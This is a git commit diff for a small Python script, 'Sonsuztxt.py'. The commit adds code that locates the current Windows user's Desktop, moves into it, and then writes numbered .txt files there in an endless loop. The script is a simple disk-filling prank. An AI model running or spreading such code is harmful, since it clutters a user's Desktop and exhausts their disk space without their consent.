c76685a5e0a5a15587151e7f7e13b9f6e3c037b7
Enes Uysal <74737994+hulkienesuysal@users.noreply.github.com>
2020-12-10 22:24:06 +0300

    Add files via upload

--- Sonsuztxt.py
+++ Sonsuztxt.py
@@ -1,7 +1,22 @@
-liste = 0
-while True:
-    liste += 1
-    print(liste)
-    file = open("{}.txt".format(liste),"w")
-    file.write("{}".format(liste))
+import os
 
+def sonsuz():
+    liste = 0
+    while True:
+        liste += 1
+        print(liste)
+        file = open("{}.txt".format(liste),"w")
+        file.write("{}".format(liste))
+
+usarname = os.environ["USERNAME"]
+nowdizin = os.getcwd()
+cusers = nowdizin[0:9]
+desktop = cusers+usarname+"\Desktop"
+
+dizinvarmi = os.path.exists("{}".format(desktop))
+
+if dizinvarmi == True:
+    os.chdir("{}".format(desktop))
+    sonsuz()
+else:    
+    sonsuz()    
